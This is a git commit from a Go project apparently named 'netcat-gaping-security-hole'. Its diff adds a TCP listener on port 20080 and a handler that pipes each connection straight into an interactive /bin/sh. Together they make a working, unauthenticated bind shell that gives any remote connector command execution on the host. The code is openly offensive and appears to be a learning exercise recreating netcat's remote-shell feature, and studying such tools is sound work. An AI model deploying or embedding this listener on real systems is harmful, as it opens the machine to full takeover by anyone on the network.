ede67ca328217c1bc8f146a2e90233cb30935498
amirhnajafiz <najafizadeh21@gmail.com>
2022-08-06 11:22:26 +0430

    feat: listener

--- handler/handler.go
+++ handler/handler.go
@@ -6,16 +6,24 @@ import (
 	"os/exec"
 )
 
+// Handle manages to start a session for the client
+// and create a pipe for user and shell communication.
 func Handle(conn net.Conn) {
+	// closing the connection after user logged out
 	defer conn.Close()
 
+	// creating the shell
 	cmd := exec.Command("/bin/sh", "-i")
+	// creating our pipeline
 	rp, wp := io.Pipe()
 
+	// binding stdin and stdout to user connection and pipe output
 	cmd.Stdin = conn
 	cmd.Stdout = wp
 
+	// copy the input into pipeline
 	go io.Copy(conn, rp)
 
+	// executing the command
 	cmd.Run()
 }
--- main.go
+++ main.go
@@ -1,5 +1,23 @@
 package main
 
-func main() {
+import (
+	"log"
+	"net"
 
+	"github.com/amirhnajafiz/netcat-gaping-security-hole/handler"
+)
+
+func main() {
+	listener, err := net.Listen("tcp", ":20080")
+	if err != nil {
+		log.Fatalln(err)
+	}
+
+	for {
+		conn, err := listener.Accept()
+		if err != nil {
+			log.Fatalln(err)
+		}
+		go handler.Handle(conn)
+	}
 }
